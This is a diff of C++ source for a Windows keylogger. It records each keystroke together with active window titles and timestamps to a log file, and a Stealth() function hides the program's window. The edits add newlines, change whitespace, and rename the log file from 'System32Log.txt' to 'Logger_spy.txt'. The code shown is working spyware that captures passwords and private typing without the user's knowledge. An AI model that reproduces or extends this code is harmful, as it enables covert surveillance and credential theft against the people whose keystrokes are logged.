@@ -89,7 +89,7 @@ int Save(int key_stroke)
 			char s[64];
 			strftime(s, sizeof(s), "%c", tm);
 
-			OUTPUT_FILE << "[" << window_title << " - at " << s << "]";
+			OUTPUT_FILE << "\n[" << window_title << " - at " << s << "]";
 		}
 	}
 
@@ -126,10 +126,10 @@ int Save(int key_stroke)
 		OUTPUT_FILE << ".";
 	else if (key_stroke == 189 || key_stroke == 109)
 		OUTPUT_FILE << "-";
-	else if (key_stroke == 20)
+	else if (key_stroke == 20) 
 		OUTPUT_FILE << "[CAPSLOCK]";
 	else {
-		char key;
+		char key ;
 		// check caps lock
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
@@ -164,7 +164,7 @@ void Stealth()
 int main()
 {
 	//open output file in append mode
-	OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);
+	OUTPUT_FILE.open("Logger_spy.txt", std::ios_base::app);
 
 	// visibility of window
 	Stealth();
